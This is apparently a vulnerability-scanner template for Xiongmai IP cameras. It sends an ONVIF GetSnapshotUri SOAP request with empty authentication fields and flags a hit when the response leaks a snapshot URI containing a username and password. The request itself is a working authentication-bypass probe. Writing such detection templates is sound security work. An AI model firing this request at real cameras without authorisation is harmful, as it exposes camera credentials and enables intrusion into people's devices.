templates/xiongmai-camera/xiongmai-onvif-authbypass.yml

cve-id: xiongmai-onvif-authbypass
manual: true
transport: http
rules:
  - method: POST
    path: /onvif/Media
    headers:
      Content-Type: application/soap+xml; charset=utf-8
      Accept-Encoding: gzip
      User-Agent: okhttp/3.12.5
    body: |
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
        <soap:Header>
          <Security xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
            <UsernameToken>
              <Username></Username>
              <Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest"></Password>
              <Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary"></Nonce>
              <Created xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"></Created>
            </UsernameToken>
          </Security>
        </soap:Header>
        <soap:Body>
          <GetSnapshotUri xmlns="http://www.onvif.org/ver10/media/wsdl">
            <ProfileToken>000</ProfileToken>
          </GetSnapshotUri>
        </soap:Body>
      </soap:Envelope>
    follow_redirects: false
    expression: |
      response.status == 200 && response.body.bcontains(b"<tt:Uri>") && response.body.bcontains(b"user=") && response.body.bcontains(b"password=")
severity:
  high
type:
  authbypass
